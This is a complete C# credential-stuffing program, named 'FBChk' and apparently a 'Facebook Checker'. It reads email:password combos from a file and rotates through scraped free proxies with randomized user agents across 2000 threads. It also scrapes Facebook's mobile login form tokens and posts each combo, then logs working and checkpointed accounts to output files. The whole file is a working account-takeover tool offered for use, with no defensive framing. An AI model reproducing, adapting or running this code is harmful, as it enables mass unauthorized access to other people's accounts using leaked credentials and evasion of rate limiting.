using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Drawing;
using Console = Colorful.Console;

namespace FBChk
{
    class Program
    {
        static int threadcount = 0;
        static Random random = new Random();
        static List<string> proxylist = new List<string>();
        static List<string> acclist = new List<string>();
        static List<string> alreadychecked = new List<string>();
        static Queue<string> checkerqueue = new Queue<string>();
        static int live = 0;
        static int dead = 0;
        static int checkpoint = 0;
        static int fullzise = 0;

        static void Main(string[] args)
        {
            try
            {
                var httpRequest = new HttpRequest();
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.ConnectTimeout = 10000;
                var content = httpRequest.Get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000");

                if (content.HasError)
                {
                    proxylist = File.ReadAllLines("proxy.txt").Distinct().ToList();
                }
                else
                {

                    HashSet<string> tmpproxylist = new HashSet<string>();
                    foreach (object obj in Regex.Matches(content.ToString(), "\\b(\\d{1,3}\\.){3}\\d{1,3}\\:\\d{1,8}\\b", RegexOptions.Singleline))
                    {
                        Match match = (Match)obj;
                        tmpproxylist.Add(match.Groups[0].Value);
                    }
                    proxylist = tmpproxylist.ToList();
                }
            }
            catch (Exception e)
            {
                proxylist = File.ReadAllLines("proxy.txt").Distinct().ToList();
            }

            Console.WriteLine("Fetched proxy count : " + proxylist.Count);

            acclist = File.ReadAllLines("acc.txt").Distinct().ToList();

            if (File.Exists("checkcache.txt"))
                alreadychecked = File.ReadAllLines("checkcache.txt").Distinct().ToList();

            acclist.ForEach(X => { if (!alreadychecked.Contains(X)) checkerqueue.Enqueue(X); });

            Console.WriteLine(String.Format("Loaded {0} non checked accounts from inside of {1} accounts", checkerqueue.Count, acclist.Count));

            fullzise = checkerqueue.Count;

            for (int i = 0; i < 2000; i++)
            {
                new Thread(new ThreadStart(() => {
                    Interlocked.Increment(ref threadcount);
                    while (checkerqueue.Count > 0)
                    {
                        Check(checkerqueue.Dequeue());
                    }
                    Interlocked.Decrement(ref threadcount);
                })).Start();
            }

            Console.WriteLine("Check begin!", Color.LimeGreen);
        }

        static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();
        static void WriteToFileThreadSafe(string text, string file)
        {
            _readWriteLock.EnterWriteLock();
            try
            {
                using (StreamWriter sw = File.AppendText(file))
                {
                    sw.WriteLine(text);
                    sw.Close();
                }
            }
            finally
            {
                _readWriteLock.ExitWriteLock();
            }
        }

        static void Check(String data)
        {
            try
            {
                if (data == null || data.Length <= 0)
                    return;
                var split = data.Split(':');
                if (split.Length < 2)
                    return;
                var mail = split[0];
                var pass = split[1];
                var proxy = proxylist[random.Next(proxylist.Count - 1)];
                string firsturi = "https://m.facebook.com/";
                string posturi = "https://m.facebook.com/login/device-based/regular/login/?refsrc=https://m.facebook.com/login.php&lwv=100&refid=9";
                HttpRequest httpRequest = new HttpRequest();
                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                httpRequest.UserAgentRandomize();
                httpRequest.EnableMiddleHeaders = true;
                httpRequest.Proxy.AbsoluteUriInStartingLine = false;
                httpRequest.ConnectTimeout = 5000;
                var resulthtml = httpRequest.Get(firsturi).ToString();
                string lsdpattern = @"name=""lsd"" value=""([^""]*)""";
                string jazoestpattern = @"name=""jazoest"" value=""([^""]*)""";
                string m_tspattern = @"name=""m_ts"" value=""([^""]*)""";
                string lipattern = @"name=""li"" value=""([^""]*)""";
                String lsdmatched = Regex.Match(resulthtml, lsdpattern).Groups[1].Value;
                String jazoestmatched = Regex.Match(resulthtml, jazoestpattern).Groups[1].Value;
                String m_tsmatched = Regex.Match(resulthtml, m_tspattern).Groups[1].Value;
                String limatched = Regex.Match(resulthtml, lipattern).Groups[1].Value;
                var urlParams = new RequestParams();
                urlParams["lsd"] = lsdmatched;
                urlParams["jazoest"] = jazoestmatched;
                urlParams["m_ts"] = m_tsmatched;
                urlParams["li"] = limatched;
                urlParams["try_number"] = 0;
                urlParams["unrecognized_tries"] = 0;
                urlParams["email"] = mail;
                urlParams["pass"] = pass;
                var httpResponse = httpRequest.Post(posturi, urlParams);
                string content = httpResponse.ToString();
                var cookies = httpRequest.Cookies.GetCookies("https://m.facebook.com/");
                bool bcheckpoint = false;
                foreach (System.Net.Cookie cookie in cookies)
                {
                    if (cookie.Name == "c_user")
                    {
                        Console.WriteLine(String.Format("[Live] {0}", data), Color.Lime);
                        Interlocked.Increment(ref live);
                        WriteToFileThreadSafe(data, "FacebookLive.txt");
                        WriteToFileThreadSafe(data, "checkcache.txt");
                        Colorful.Console.Title = string.Format("Facebook Checker | Alive: {0} Checkpoint {5} Dead: {1} | Status: {2}/{3} | Threads {4}", live, dead, live + dead, fullzise, threadcount, checkpoint);
                        return;
                    }
                    if (cookie.Name == "checkpoint")
                        bcheckpoint = true;
                }
                if (bcheckpoint)
                {
                    Interlocked.Increment(ref checkpoint);
                    Console.WriteLine(String.Format("[Checkpoint] {0}", data), Color.Yellow);
                    WriteToFileThreadSafe(data, "FacebookCheckPoint.txt");
                }
                else
                {
                    Interlocked.Increment(ref dead);
                    Console.WriteLine(String.Format("[Dead] {0}", data), Color.Red);
                }
                WriteToFileThreadSafe(data, "checkcache.txt");
                Colorful.Console.Title = string.Format("Facebook Checker | Alive: {0} - Checkpoint: {5} - Dead: {1} | Status: {2}/{3} | Threads {4}", live, dead, live + checkpoint + dead, fullzise, threadcount, checkpoint);
            }
            catch
            {
                Check(data);
            }
        }
    }
}
